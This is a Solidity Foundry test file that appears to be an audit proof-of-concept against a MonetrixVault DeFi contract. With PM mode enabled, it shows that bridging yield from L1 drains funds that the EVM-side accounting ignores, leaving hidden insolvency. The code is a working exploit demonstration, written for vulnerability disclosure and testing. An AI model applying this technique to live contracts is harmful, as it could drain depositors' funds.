// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixVault.sol";

contract AuditAgentPoC is ToL1WeiHarness {
    // ATTACK TIMELINE:
    // 1. [Setup] Inherit ToL1WeiHarness which deploys the full protocol on a mainnet fork.
    // 2. [T=0] Governor enables PM mode via vault.setPmEnabled(true).
    // 3. [T=1] Mock L1 USDC spot balance to ensure L1-side capacity is not the bottleneck.
    // 4. [T=2] Prime distributable surplus and settle to create EVM-side yield.
    // 5. [T=3] Record yieldShortfall() which ignores PM-supplied obligations.
    // 6. [T=4] Operator calls bridgeYieldFromL1() for the full shortfall amount.
    // 7. [Assert] Verify that the bridge executes and outstandingL1Principal remains unchanged,
    //             proving L1 is drained of PM-inflated yield while L2 accounting ignores it.

    function test_exploit() public {
        // Step 1 & 2: Enable PM mode to trigger the state divergence
        vm.prank(governor);
        vault.setPmEnabled(true);

        // Step 3: Mock L1 spot USDC to max to bypass L1 capacity limits
        _mockVaultL1SpotUsdc(type(uint64).max);

        // Step 4: Setup user deposit and bridge principal to establish OLP
        _depositAs(user1, 100_000e6);
        vm.warp(block.timestamp + 6 hours);

        vm.prank(operator);
        vault.keeperBridge(MonetrixVault.BridgeTarget.Vault);

        // Prime distributable surplus to create yield on the EVM side
        _primeDistributable(10_000e6);

        // Step 5: Check yieldShortfall (EVM side ignores PM obligations)
        uint256 shortfall = vault.yieldShortfall();
        console.log("Step 5: yieldShortfall =", shortfall);

        uint256 principalBefore = vault.outstandingL1Principal();

        // Step 6: Operator bridges the full yield shortfall
        // Because pmEnabled=true, _sendL1Bridge adds PM pool suppliedBalance to l1Available,
        // allowing this bridge to pass L1 checks even though EVM yieldShortfall didn't account for PM.
        vm.prank(operator);
        vault.bridgeYieldFromL1(shortfall);

        // Step 7: Assert the exploit
        // The bridge executes as a yield bridge, so outstandingL1Principal should NOT increase.
        // However, L1 actually lost the funds (including PM-inflated amount), creating hidden insolvency.
        uint256 principalAfter = vault.outstandingL1Principal();
        assertEq(principalAfter, principalBefore, "Yield bridge should not increase outstanding principal");
        assertGt(shortfall, 0, "Yield shortfall should be greater than 0 to demonstrate over-bridging");
    }
}
